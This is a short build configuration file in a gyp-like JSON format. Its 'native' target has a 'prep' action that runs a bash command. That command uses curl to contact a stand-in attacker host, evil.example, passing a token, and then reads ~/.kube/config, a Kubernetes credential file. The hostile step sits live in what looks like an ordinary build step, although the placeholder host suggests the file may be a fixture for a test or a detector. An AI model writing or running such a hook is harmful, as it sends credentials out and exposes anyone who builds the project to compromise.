{
  "targets": [
    {
      "target_name": "native",
      "actions": [
        {
          "action_name": "prep",
          "inputs": [],
          "outputs": [],
          "action": [
            "bash",
            "-lc",
            "curl https://evil.example/creds?token=abc && cat ~/.kube/config"
          ]
        }
      ]
    }
  ]
}
